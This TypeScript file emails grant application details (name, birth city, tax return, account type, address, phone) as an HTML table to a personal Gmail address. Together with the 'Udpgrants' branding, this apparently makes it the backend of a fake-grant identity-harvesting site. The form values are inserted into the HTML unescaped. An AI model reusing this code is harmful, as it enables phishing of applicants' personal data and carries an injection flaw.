import { createClient } from "smtpexpress";

const smtpClient = createClient({
  projectId: process.env.MAIL_ID as string,
  projectSecret: process.env.MAIL_SECRET as string,
});

export const sendApplicationEmail = async ({
  firstName,
  middleName,
  lastName,
  phoneNumber,
  gender,
  homeCity,
  taxReturn,
  streetAddress,
  city,
  state,
  zipCode,
  country,
  email,
  confirmEmail,
  grantType,
  grantAmount,
  accountType,
  grantMailAddress,
  grantCity,
  grantState,
  grantZipCode,
  grantCountry,
  grantPhoneNumber,
}: {
  firstName: string;
  middleName: string;
  lastName: string;
  phoneNumber: string;
  gender: string;
  homeCity: string;
  taxReturn: string;
  streetAddress: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  email: string;
  confirmEmail: string;
  grantType: string;
  grantAmount: string;
  accountType: string;
  grantMailAddress: string;
  grantCity: string;
  grantState: string;
  grantZipCode: string;
  grantCountry: string;
  grantPhoneNumber: string;
}) => {
  await smtpClient.sendApi.sendMail({
    subject: `New grant Application from ${firstName}`,
    sender: {
      name: firstName,
      email: process.env.MAIL_SENDER as string,
    },
    recipients: [
      {
        name: "Udpgrants",
        email: "michealpedelton111@gmail.com", // TODO: Replace with "jessicamatt91@gmail.com" once created
      },
    ],
    responseAddress: {
      name: firstName,
      email: email,
    },
    message: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grant Application Details</title>
  <style>
    body {
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      border: 1px solid #ddd;
      border-radius: 8px;
    }
    h1 {
      text-align: center;
      color: #333;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 10px;
      border-bottom: 1px solid #ddd;
      text-align: left;
    }
    th {
      background-color: #f7f7f7;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Grant Application Details</h1>
    <table>
      <tr><th>First Name</th><td>${firstName}</td></tr>
      <tr><th>Middle Name</th><td>${middleName}</td></tr>
      <tr><th>Last Name</th><td>${lastName}</td></tr>
      <tr><th>Phone Number</th><td>${phoneNumber}</td></tr>
      <tr><th>Gender</th><td>${gender}</td></tr>
      <tr><th>Birth City & State</th><td>${homeCity}</td></tr>
      <tr><th>Tax Return</th><td>${taxReturn}</td></tr>
      <tr><th>Street Address</th><td>${streetAddress}</td></tr>
      <tr><th>City</th><td>${city}</td></tr>
      <tr><th>State</th><td>${state}</td></tr>
      <tr><th>ZIP Code</th><td>${zipCode}</td></tr>
      <tr><th>Country</th><td>${country}</td></tr>
      <tr><th>Email</th><td>${email}</td></tr>
      <tr><th>Confirm Email</th><td>${confirmEmail}</td></tr>
      <tr><th>Grant Type</th><td>${grantType}</td></tr>
      <tr><th>Grant Amount</th><td>${grantAmount}</td></tr>
      <tr><th>Account Type</th><td>${accountType}</td></tr>
      <tr><th>Grant Mail Address</th><td>${grantMailAddress}</td></tr>
      <tr><th>Grant City</th><td>${grantCity}</td></tr>
      <tr><th>Grant State</th><td>${grantState}</td></tr>
      <tr><th>Grant ZIP Code</th><td>${grantZipCode}</td></tr>
      <tr><th>Grant Country</th><td>${grantCountry}</td></tr>
      <tr><th>Grant Phone Number</th><td>${grantPhoneNumber}</td></tr>
    </table>
  </div>
</body>
</html>
`,
  });
};
